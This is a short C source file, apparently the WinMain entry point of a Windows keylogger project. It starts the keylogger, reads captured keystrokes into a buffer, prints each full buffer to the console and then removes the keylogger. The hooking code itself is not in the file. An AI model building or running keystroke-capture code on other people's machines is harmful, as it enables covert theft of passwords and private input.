#include "WinKeylogger.h"
#include <stdio.h>


int APIENTRY WinMain(
                     HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     PSTR pCmdLine,
                     int nCmdShow
                    )
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(pCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);

    WCHAR tmp_buff[INPUT_BUFFER_SIZE];

    StartWinKeylogger();

    size_t buflen = 0;
    while (ReadNextCharToInputBuffer(&buflen))
        if (buflen == INPUT_BUFFER_SIZE - 1) {
            StrCpyFullBuffer(tmp_buff);
            wprintf(L"%s\n",  tmp_buff);
            buflen = 0;
        }

    RemoveWinKeylogger();
    return 0;
}
